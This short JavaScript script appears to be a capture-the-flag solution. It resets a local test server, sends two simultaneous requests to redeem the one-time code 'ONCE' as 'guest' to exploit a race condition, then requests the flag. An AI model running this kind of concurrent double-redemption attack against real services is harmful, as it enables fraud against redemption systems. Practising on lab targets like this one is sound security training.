const base = 'http://localhost:3000'

await fetch(`${base}/reset`)

const [a, b] = await Promise.all([
  fetch(`${base}/redeem?u=guest&code=ONCE`),
  fetch(`${base}/redeem?u=guest&code=ONCE`),
])

console.log(await a.text())
console.log(await b.text())

const flagResp = await fetch(`${base}/flag?u=guest`)
console.log(await flagResp.text())
